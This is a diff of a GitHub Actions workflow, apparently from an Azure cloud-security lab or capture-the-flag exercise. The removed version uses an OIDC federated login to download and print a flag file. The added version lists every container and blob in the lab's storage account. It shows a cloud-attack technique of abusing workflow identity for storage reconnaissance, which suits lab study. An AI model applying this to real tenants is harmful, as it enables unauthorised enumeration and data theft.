@@ -1,31 +1,46 @@
-name: Get Flag
-on: [workflow_dispatch]
+name: Enumerate Azure Storage
+
+on:
+  workflow_dispatch:
 
 permissions:
   id-token: write
   contents: read
 
 jobs:
-  get-flag:
+  enumerate:
     runs-on: ubuntu-latest
     steps:
-      - name: Azure login
+
+      - name: Login to Azure via OIDC
         uses: azure/login@v2
         with:
           client-id: 0f7196d5-d393-44f6-96eb-b06cd5312ddc
           tenant-id: fdd066e1-ee37-49bc-b08f-d0e152119b04
           subscription-id: 5ff86dd0-ee91-4f26-901a-158f9242c514
-          enable-AzPSSession: true
 
-      - name: Download flag
+      - name: Enumerar todo el storage
         run: |
-          az storage blob download \
-            --account-name iamazurelab325a466ba \
-            --container-name flag \
-            --name flag.txt \
-            --file flag.txt \
-            --auth-mode login
+          SA="iamazurelab325a466ba"
 
-      - name: Read flag
-        run: |
-          cat flag.txt
+          echo "=== CONTENEDORES ==="
+          az storage container list \
+            --account-name $SA \
+            --auth-mode login \
+            --query '[].{nombre:name}' \
+            -o tsv
+
+          echo "=== BLOBS POR CONTENEDOR ==="
+          for CONT in $(az storage container list \
+            --account-name $SA \
+            --auth-mode login \
+            --query '[].name' \
+            -o tsv); do
+            echo "--- Contenedor: $CONT ---"
+            az storage blob list \
+              --container-name $CONT \
+              --account-name $SA \
+              --auth-mode login \
+              --query '[].name' \
+              -o tsv
+          done
